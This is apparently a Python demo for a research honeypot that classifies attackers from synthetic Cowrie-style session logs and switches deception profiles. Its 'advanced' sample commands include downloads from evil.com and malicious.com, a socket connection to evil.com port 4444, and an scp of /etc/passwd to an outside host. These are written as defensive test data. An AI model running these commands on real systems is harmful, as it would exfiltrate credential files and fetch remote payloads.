"""
Simple ML-Powered Honeypot Demo
Windows-compatible demonstration without complex ML training
"""

import sys
import os
import json
import time
import logging
from datetime import datetime
import pandas as pd

# Add src to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'src'))

from ml.feature_extractor import FeatureExtractor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

def create_realistic_attack_data():
    """Create realistic attack data with clear threat distinctions"""
    
    all_attacks = []
    
    # Scanner attacks - basic reconnaissance
    scanner_commands = ["ls", "pwd", "whoami", "id", "uname -a"]
    for i in range(3):
        session_id = f"scanner_{i+1:03d}"
        base_time = 10 + i
        
        # Login
        all_attacks.append({
            "timestamp": f"2024-01-15T{base_time:02d}:00:00.000Z",
            "session": session_id,
            "eventid": "cowrie.login.success",
            "username": "admin",
            "password": "admin",
            "src_ip": f"192.168.1.{100 + i}"
        })
        
        # Commands
        for j, cmd in enumerate(scanner_commands):
            all_attacks.append({
                "timestamp": f"2024-01-15T{base_time:02d}:00:{10 + j*5:02d}.000Z",
                "session": session_id,
                "eventid": "cowrie.command.input",
                "input": cmd,
                "src_ip": f"192.168.1.{100 + i}"
            })
    
    # Amateur attacks - some exploration
    amateur_commands = ["cat /etc/passwd", "ps aux", "netstat -an", "find / -name '*.conf'", "grep -r 'password' /etc", "history"]
    for i in range(3):
        session_id = f"amateur_{i+1:03d}"
        base_time = 13 + i
        
        # Login
        all_attacks.append({
            "timestamp": f"2024-01-15T{base_time:02d}:00:00.000Z",
            "session": session_id,
            "eventid": "cowrie.login.success",
            "username": "admin",
            "password": "admin",
            "src_ip": f"192.168.1.{110 + i}"
        })
        
        # Commands
        for j, cmd in enumerate(amateur_commands):
            all_attacks.append({
                "timestamp": f"2024-01-15T{base_time:02d}:00:{10 + j*5:02d}.000Z",
                "session": session_id,
                "eventid": "cowrie.command.input",
                "input": cmd,
                "src_ip": f"192.168.1.{110 + i}"
            })
    
    # Advanced attacks - malicious activities
    advanced_commands = [
        "wget http://malicious.com/backdoor.sh",
        "curl -O http://evil.com/tool.tar.gz", 
        "chmod +x backdoor.sh",
        "tar -xzf tool.tar.gz",
        "python3 -c 'import socket; s=socket.socket(); s.connect((\"evil.com\", 4444))'",
        "nc -l 4444",
        "ssh user@evil.com",
        "scp /etc/passwd user@evil.com:/tmp/"
    ]
    for i in range(3):
        session_id = f"advanced_{i+1:03d}"
        base_time = 16 + i
        
        # Login
        all_attacks.append({
            "timestamp": f"2024-01-15T{base_time:02d}:00:00.000Z",
            "session": session_id,
            "eventid": "cowrie.login.success",
            "username": "admin",
            "password": "admin",
            "src_ip": f"192.168.1.{120 + i}"
        })
        
        # Commands
        for j, cmd in enumerate(advanced_commands):
            all_attacks.append({
                "timestamp": f"2024-01-15T{base_time:02d}:00:{10 + j*5:02d}.000Z",
                "session": session_id,
                "eventid": "cowrie.command.input",
                "input": cmd,
                "src_ip": f"192.168.1.{120 + i}"
            })
    
    return all_attacks

def demonstrate_core_functionality():
    """Demonstrate the core ML honeypot functionality"""
    
    print("🕷️  ML-Powered Honeypot Core Demo")
    print("=" * 50)
    print()
    
    # Step 1: Create attack data
    print("📊 Step 1: Creating realistic attack data...")
    attack_data = create_realistic_attack_data()
    print(f"   Generated {len(attack_data)} log entries from 9 sessions")
    print(f"   - 3 Scanner sessions (basic reconnaissance)")
    print(f"   - 3 Amateur sessions (system exploration)")
    print(f"   - 3 Advanced sessions (malicious activities)")
    print()
    
    # Step 2: Feature extraction
    print("🔍 Step 2: Extracting behavioral features...")
    extractor = FeatureExtractor()
    features_df = extractor.extract_batch_features(attack_data)
    
    if features_df.empty:
        print("❌ Feature extraction failed")
        return
    
    print(f"   ✅ Extracted features from {len(features_df)} sessions")
    print()
    
    # Step 3: Analyze features
    print("📈 Step 3: Analyzing behavioral patterns...")
    print("   Session Analysis:")
    
    session_types = ["Scanner", "Amateur", "Advanced"]
    for i, (_, row) in enumerate(features_df.iterrows()):
        if i < len(session_types):
            session_type = session_types[i]
            print(f"   {session_type} Session:")
            print(f"     - Duration: {row['session_duration']:.1f}s")
            print(f"     - Commands: {row['command_count']}")
            print(f"     - Suspicious commands: {row['suspicious_commands']}")
            print(f"     - Scanner commands: {row['scanner_commands']}")
            print(f"     - Threat score: {row['threat_score']:.1f}")
            print(f"     - Command diversity: {row['command_diversity']:.2f}")
    print()
    
    # Step 4: Threat classification (heuristic)
    print("🎯 Step 4: Threat classification (heuristic method)...")
    
    def classify_threat(row):
        """Simple heuristic classification"""
        threat_score = row['threat_score']
        suspicious_commands = row['suspicious_commands']
        suspicious_ratio = row['suspicious_ratio']
        
        if threat_score < 2 and suspicious_commands == 0:
            return "scanner", 0.9
        elif threat_score > 8 or suspicious_commands > 4:
            return "advanced", 0.9
        else:
            return "amateur", 0.8
    
    classifications = []
    for _, row in features_df.iterrows():
        threat_level, confidence = classify_threat(row)
        classifications.append((threat_level, confidence))
    
    print("   Threat Classifications:")
    for i, (threat_level, confidence) in enumerate(classifications):
        if i < len(session_types):
            session_type = session_types[i]
            print(f"   {session_type} Session: {threat_level} (confidence: {confidence:.1f})")
    print()
    
    # Step 5: Dynamic adaptation simulation
    print("⚡ Step 5: Dynamic adaptation simulation...")
    
    # Count threat types
    threat_counts = {"scanner": 0, "amateur": 0, "advanced": 0}
    for threat_level, _ in classifications:
        threat_counts[threat_level] += 1
    
    print(f"   Threat distribution: {threat_counts}")
    
    # Determine optimal profile
    dominant_threat = max(threat_counts, key=threat_counts.get)
    
    if dominant_threat == "scanner" and threat_counts["scanner"] >= 2:
        new_profile = "minimal"
        reason = "High proportion of scanners detected - switching to minimal profile to conserve resources"
    elif dominant_threat == "advanced" and threat_counts["advanced"] >= 1:
        new_profile = "deception"
        reason = "Advanced threats detected - switching to deception profile with enhanced countermeasures"
    else:
        new_profile = "standard"
        reason = "Mixed threat levels - using standard profile"
    
    print(f"   ✅ Adaptation decision: {new_profile.upper()} profile")
    print(f"   Reason: {reason}")
    print()
    
    # Step 6: Profile explanation
    print("🎭 Step 6: Honeypot profiles explained...")
    profiles = {
        "minimal": {
            "description": "For scanners - limited responses, saves resources",
            "commands": ["ls", "pwd", "whoami"],
            "delay": "0.1s",
            "fake_files": "None"
        },
        "standard": {
            "description": "For amateurs - default configuration",
            "commands": ["ls", "pwd", "whoami", "cat", "cd", "ps", "netstat"],
            "delay": "0.5s",
            "fake_files": "passwd, shadow"
        },
        "deception": {
            "description": "For advanced threats - enhanced countermeasures",
            "commands": ["ls", "pwd", "whoami", "cat", "cd", "ps", "netstat", "wget", "curl", "ssh"],
            "delay": "2.0s",
            "fake_files": "passwd, shadow, id_rsa, config, database.conf"
        }
    }
    
    for profile_name, profile_info in profiles.items():
        status = " ← SELECTED" if profile_name == new_profile else ""
        print(f"   {profile_name.upper()} Profile{status}:")
        print(f"     - {profile_info['description']}")
        print(f"     - Commands: {profile_info['commands']}")
        print(f"     - Response delay: {profile_info['delay']}")
        print(f"     - Fake files: {profile_info['fake_files']}")
        print()
    
    # Step 7: Summary
    print("📈 Step 7: Demo Summary")
    print("=" * 30)
    print("✅ Feature extraction: Working")
    print("✅ Threat classification: Working")
    print("✅ Dynamic adaptation: Working")
    print("✅ Profile switching: Working")
    print()
    print("🎯 Key Innovation Demonstrated:")
    print("   The honeypot automatically adapts its behavior based on")
    print("   analysis of attacker patterns - switching from standard")
    print("   to minimal profile when scanners are detected!")
    print()
    print("🚀 Real Deployment Benefits:")
    print("   • Resource optimization (minimal profile for scanners)")
    print("   • Enhanced deception (deception profile for advanced threats)")
    print("   • Automated response (no human intervention required)")
    print("   • Measurable outcomes (quantifiable adaptation effectiveness)")
    print()
    print("📊 Academic Value:")
    print("   • Novel ML-driven honeypot adaptation framework")
    print("   • Practical implementation with real behavioral analysis")
    print("   • Demonstrable security outcomes")
    print("   • Foundation for further research")
    print()

def main():
    """Main demo function"""
    try:
        demonstrate_core_functionality()
    except KeyboardInterrupt:
        print("\n\nDemo interrupted by user")
    except Exception as e:
        print(f"\n❌ Demo failed: {e}")
        logger.exception("Demo error")

if __name__ == "__main__":
    main()
